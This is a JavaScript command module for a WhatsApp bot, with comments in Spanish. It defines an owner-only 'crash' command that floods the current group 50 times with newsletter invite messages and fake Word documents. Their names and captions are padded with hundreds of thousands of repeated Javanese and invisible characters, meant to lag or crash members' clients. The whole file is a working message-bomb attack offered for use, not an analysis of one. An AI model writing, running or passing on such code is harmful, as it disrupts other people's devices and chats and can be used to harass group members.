export default {
  command: ['crash'],
  category: 'owner',
  isOwner: true,
  run: async (client, m) => {
    // Definimos el objetivo como el chat actual
    const groupId = m.key.remoteJid

    // Verificación: Solo permitir en grupos para evitar bloqueos accidentales en privado
    if (!groupId.endsWith('@g.us')) {
      return client.sendMessage(groupId, { 
        text: '❌ Este comando solo puede ser ejecutado dentro de un grupo.' 
      }, { quoted: m })
    }

    // --- FUNCIONES DE ATAQUE ---
    const canalKillGrupo = async () => {
      const basura = 'ꦾ'.repeat(90000)
      await client.relayMessage(groupId, {
        newsletterAdminInviteMessage: {
          newsletterJid: "120363229729656123@newsletter",
          newsletterName: "ADOi" + basura.repeat(3),
          jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gALAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
          caption: "El mDKDNND",
          inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
        }
      }, {})
    }

    const docKillGrupo = async (i) => {
      const traba = 'ꦾ'.repeat(90000)
      const contenido = '\u200E'.repeat(5000) + i
      await client.sendMessage(groupId, {
        document: Buffer.from(contenido),
        fileName: `ado 🔥_${i + 1}`.repeat(2),
        mimetype: 'application/msword',
        caption: traba.repeat(3)
      })
    }

    // --- INICIO DEL CICLO ---
    // Notificación silenciosa o aviso de inicio
    await client.sendMessage(groupId, { text: `✅ Iniciando proceso en este grupo...` }, { quoted: m })

    const delayMs = 9000
    for (let i = 0; i < 50; i++) {
      try {
        await canalKillGrupo()
        await new Promise(r => setTimeout(r, 1500)) // Un pequeño respiro extra entre tipos de mensajes
        await docKillGrupo(i)
        await new Promise(r => setTimeout(r, delayMs))
      } catch (err) {
        console.error("Error en el ciclo:", err)
        break // Detener si hay un error crítico (como ser expulsado)
      }
    }

    // Nota: Es probable que no llegues a ver este mensaje si el lag es efectivo
    await client.sendMessage(groupId, { 
      text: `✅ Proceso finalizado.` 
    }, { quoted: m })
  }
}
